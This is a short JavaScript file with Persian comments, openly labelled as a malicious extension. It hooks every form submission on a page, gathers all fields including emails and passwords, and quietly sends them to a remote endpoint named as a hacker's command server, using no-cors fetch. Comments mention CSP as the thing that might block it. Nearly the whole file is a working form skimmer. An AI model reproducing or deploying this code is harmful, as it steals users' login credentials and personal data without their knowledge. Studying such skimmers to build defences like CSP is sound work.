console.log("👿 افزونه مخرب با موفقیت لود شد!");

// شنود تمام فرم‌هایی که سابمیت می‌شوند
document.addEventListener('submit', function(e) {
    let stolenData = {};
    let formData = new FormData(e.target);

    // استخراج تمام فیلدهای فرم (ایمیل، پسورد و ...)
    for (let [key, value] of formData.entries()) {
        if (key !== '_token') { // توکن CSRF را لاگ نمی‌کنیم تا خروجی تمیزتر باشد
            stolenData[key] = value;
        }
    }

    console.log("🕵️ در حال سرقت اطلاعات: ", stolenData);

    // آدرس سرور هکر (C2)
    let hackerUrl = 'http://hackerapp.eitebar.ir/stealer?data=' + encodeURIComponent(JSON.stringify(stolenData));

    // ارسال مخفیانه اطلاعات بدون متوقف کردن روند عادی فرم
    fetch(hackerUrl, {
        method: 'GET',
        mode: 'no-cors' // برای دور زدن خطاهای CORS در مرورگر
    }).then(() => {
        console.log("✅ اطلاعات با موفقیت به سرور هکر ارسال شد!");
    }).catch(err => {
        console.error("❌ مرورگر جلوی ارسال اطلاعات را گرفت (احتمالاً به دلیل CSP):", err);
    });
});